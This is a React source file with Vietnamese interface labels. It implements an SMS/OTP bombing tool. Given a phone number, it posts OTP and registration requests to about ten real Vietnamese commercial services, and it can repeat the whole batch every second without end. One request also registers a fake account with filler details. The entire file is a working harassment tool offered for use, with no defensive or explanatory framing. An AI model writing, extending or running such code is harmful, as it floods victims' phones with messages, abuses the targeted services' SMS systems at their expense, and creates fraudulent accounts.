import { useState, useRef } from 'react';
import axios from 'axios';
import './App.css';

function App() {
  const [sdt, setSdt] = useState('');
  const [count, setCount] = useState(0);
  const intervalRef = useRef(null);

  const sendOtpRequest = async (sdt) => {
    try {
      await axios.post('https://tv360.vn/public/v1/auth/get-otp-login', { msisdn: sdt });
      await axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
        phoneNumber: sdt,
        otpType: 0,
        fromSys: 'WEBKHLC'
      });
      await axios.post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', {
        phoneNumber: sdt,
        messageCode: 'phone-verification.message_sent'
      });
      await axios.post('https://medicare.vn/api/otp', {
        mobile: sdt,
        mobile_country_prefix: '84'
      });
      await axios.post('https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp', {
        username: sdt,
        case: 'register'
      });
      await axios.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', {
        phone: sdt,
        type: 'register'
      });
      await axios.post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', {
        phoneNumber: sdt
      });
      await axios.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', { phone: sdt });
      await axios.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', {
        phone_number: sdt,
        name: 'Huu fsdf',
        password: 'dfsdfdsf23432',
        email: 'callme@ggg.vom',
        birthday: '2008-02-01',
        gender: 'female'
      });
      await axios.post('https://api.vato.vn/api/authenticate/request_code', {
        phoneNumber: sdt,
        deviceId: 'c5dbb970-edb4-4b6a-a347-3582dd115e67',
        use_for: 'LOGIN'
      });
      console.log('All requests were sent successfully');
    } catch (error) {
      console.error('Error:', error);
    }
  };

  const handleRunOnce = () => {
    sendOtpRequest(sdt);
  };

  const handleRunInfinite = () => {
    intervalRef.current = setInterval(() => {
      sendOtpRequest(sdt);
      setCount(prevCount => prevCount + 1);
    }, 1000); // Chạy mỗi giây
  };

  const handleStopInfinite = () => {
    clearInterval(intervalRef.current);
  };

  return (
    <div>
      <input
        type="text"
        value={sdt}
        onChange={(e) => setSdt(e.target.value)}
        placeholder="Nhập số điện thoại"
      />
      <br />
      <button onClick={handleRunOnce}>Chạy 1 lần</button>
      <button onClick={handleRunInfinite}>Chạy vô hạn</button>
      <button onClick={handleStopInfinite}>Dừng chạy vô hạn</button>
      <p>Số lần đã chạy: {count}</p>
    </div>
  );
}

export default App;
